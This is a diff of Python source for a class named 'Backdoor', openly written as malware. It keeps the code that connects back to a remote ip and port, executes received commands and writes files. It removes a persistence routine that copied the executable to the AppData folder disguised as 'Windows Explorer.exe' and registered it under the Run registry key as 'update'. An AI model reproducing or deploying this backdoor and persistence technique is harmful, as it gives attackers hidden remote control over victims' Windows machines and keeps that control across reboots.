@@ -11,7 +11,6 @@ import shutil
 
 class Backdoor:
 	def  __init__(self, ip, port):
-		self.become_persistence()
 		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.connection.connect((ip, port))
 
@@ -35,12 +34,6 @@ class Backdoor:
 				output_data = "[-] Error during command execution."
 			self.reliable_send(output_data)
 
-	
-	def become_persistence(self):
-		evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
-		if not os.path.exists(evil_file_location):
-			shutil.copyfile(sys.executable, evil_file_location)
-			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"', shell=True)
 
 	def write_file(self, path ,content):
 		with open(path, "wb") as file :
